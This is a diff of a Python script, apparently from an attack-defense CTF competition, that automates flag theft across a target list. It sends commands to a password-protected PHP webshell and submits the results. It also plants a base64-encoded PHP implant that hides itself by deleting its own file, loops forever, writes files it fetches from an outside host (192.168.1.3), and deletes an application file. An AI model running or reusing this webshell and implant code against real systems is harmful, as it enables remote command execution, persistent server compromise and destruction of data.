@@ -1,23 +1,12 @@
 from lib.parseburplog import parseburprequest
 from core.common import repeat
 from core.data import conf
+from lib.submit_flag import submit_flag
 import requests
+from core.data import *
 import re
 
 
-# def getflag_raw():
-#     header, url, data, mathod = parseburprequest(conf.request)
-#     for target in conf.targets:
-#         target = target.strip + conf.url
-#         result = repeat(target,data,mathod)
-#         print(result)
-
-
-# def getflag():
-#     for target in conf.targets:
-#         target = target.strip + conf.url
-#         result = repeat(target, None, "GET")
-#         print(result)
 
 def getflag():  #获取flag并自动提交，通过webshell来获取flag
     uri = "/.user_config.php"  #shell地址
@@ -27,20 +16,14 @@ def getflag():  #获取flag并自动提交，通过webshell来获取flag
 	}
     data = "pass=WJdhNWqs&cmd=system('cat /flag');"
     #data = "cmd=system('cat /flag');"
-    with open('targets.txt', 'r') as f:
+    with open('web_targets.txt', 'r') as f:
         targets = f.readlines()
         for target in targets:
             target = target.strip()
             url = "http://" + target + uri
             try:
                 res = requests.post(url, headers=header, data=data,timeout=1)
-                #正则匹配flag
-                pattern = "flag\{.*\}"
-                z = re.search(pattern, res.text)
-                flag = z.group()
-                #flag = res.text.strip()
-                print(flag)
-                submit_flag(flag)
+                submit_flag(res)
             except Exception as f:
                 print(f)
                 print(url + "\tshell未上传成功\n")
@@ -54,7 +37,7 @@ def webshell():   #获取webshell
         "Referer": ''''''
     }
     poc = "echo -n 'PD9waHAgCglzZXRfdGltZV9saW1pdCgwKTsKCWVycm9yX3JlcG9ydGluZygwKTsKCXVubGluayhfX0ZJTEVfXyk7Cgl3aGlsZSgxKXsKCQlmaWxlX3B1dF9jb250ZW50cyhmaWxlX2dldF9jb250ZW50cygnaHR0cDovLzE5Mi4xNjguMS4zLzEudHh0JyksZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly8xOTIuMTY4LjEuMy8yLnR4dCcpKTsKCQkvL3VzbGVlcCg1MDAwKTsKCQlzbGVlcCgxKTsKCQkkZmlsZSA9ICcvdmFyL3d3dy9odG1sL2FwcGxpY2F0aW9uL2NvbW1vbi5waHAnOwoJCWlmKGZpbGVfZXhpc3RzKCRmaWxlKSl7CgkJCXVubGluaygkZmlsZSk7CgkJfQoJfQo/Pg==' |base64 -d >>//var/www/html/cc.php"
-    with open('targets.txt', 'r') as f:
+    with open('web_targets.txt', 'r') as f:
         targets = f.readlines()
 
         for target in targets:
